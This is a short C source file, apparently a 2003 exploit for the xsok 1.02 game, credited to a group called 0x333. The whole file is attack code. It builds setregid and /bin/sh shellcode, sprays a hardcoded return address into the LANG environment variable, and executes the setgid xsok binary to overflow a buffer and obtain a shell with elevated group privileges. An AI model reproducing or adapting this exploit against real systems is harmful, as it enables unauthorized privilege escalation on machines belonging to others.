/* 0x333xsok => xsok 1.02 local game exploit
 *
 *  Happy new year !
 *  coded by c0wboy 
 *
 *  (c) 0x333 Outsiders Security Labs / www.0x333.org
 *
 */


#include <stdio.h>
#include <unistd.h>

#define BIN     "/usr/games/xsok"
#define RETADD  0xbffff3b8
#define SIZE    100


unsigned char shellcode[] =

	/* setregid (20,20) shellcode */
	"\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47"
	"\xcd\x80"

	/* exec /bin/sh shellcode */
	"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
	"\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";


	
int main (int argc, char ** argv)
{
	int i, ret = RETADD;
	char out[SIZE];

	fprintf(stdout, "\n ---   0x333xsok => xsok 1.02 local games exploit   ---\n");
	fprintf(stdout, "   ---       Outsiders Se(c)urity Labs 2003       ---\n\n");

	int *xsok = (int *)(out);

	for (i=0; i<SIZE-1 ; i+=4, *xsok++ = ret);

	memcpy((char *)out, shellcode, strlen(shellcode));
	setenv("LANG", out, 0x333); /* :) */

	execl (BIN, BIN, 0x0);
}


